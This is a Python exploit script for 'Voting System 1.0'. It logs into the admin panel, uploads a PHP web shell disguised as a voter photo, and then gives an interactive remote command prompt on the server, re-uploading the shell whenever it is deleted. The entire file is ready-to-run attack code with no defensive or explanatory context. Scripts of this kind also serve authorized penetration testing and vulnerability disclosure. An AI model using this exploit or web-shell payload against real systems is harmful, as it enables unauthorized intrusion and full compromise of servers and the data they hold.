import requests
import argparse

def shell(url,uname,passw):
    urlshell = url + '/images/boom.php'

    while True:
        r3 = requests.get(urlshell)
        if r3.status_code != 200:
            print("File has been deleted. Re-Uploading file!")
            upload(url,uname,passw)
            break
        else:
            cmd = input("RCE: ")
            
            data3 = {
                'cmd':cmd
            }
            r4 = requests.post(urlshell,data=data3)
            if r4.status_code != 200:
                print("File has been deleted. Re-Uploading file!")
                upload(url,uname,passw)
                break
            else:
                print(r4.text)

def upload(url,uname,passw):
    payload = "<?php echo system($_REQUEST['cmd']); ?>"

    urllogin = url + '/admin/login.php' 
    s = requests.Session() 
    ldata = {
        'username':uname,'password':passw,'login':''
    }

    r1 = s.post(urllogin,data=ldata) 

    urlupload = url + '/admin/voters_add.php' 
    fdata = { 
        'firstname':'test','lastname':'voter','password':'passw0rd','add':''
    } 
    fileup = { 
        'photo':('boom.php',payload,{'Content-Type':'application/x-php'},{'Content-Disposition':'form-data'})
    } 

    r2 = s.post(urlupload,data=fdata,files=fileup)
    if r2.status_code == 200:
        print("Uploaded Exploit!")
        shell(url,uname,passw)
    else:
        print("Something went wrong with the upload!")
        exit()

def main():
    parser = argparse.ArgumentParser(description='Voting System 1.0 File Upload Authenticated Remote Code Execution')

    parser.add_argument('-t', metavar='<Target URL>', help='target/host URL, E.G: http://exploitvoting.com', required=True)
    parser.add_argument('-u', metavar='<user>', help='Username', required=True)
    parser.add_argument('-p', metavar='<password>', help="Password", required=True)
    args = parser.parse_args()

    url = args.t
    uname = args.u
    passw = args.p

    while True:
        try:
            upload(url,uname,passw)
        except KeyboardInterrupt:
            print("Bye Bye")
            exit()

main()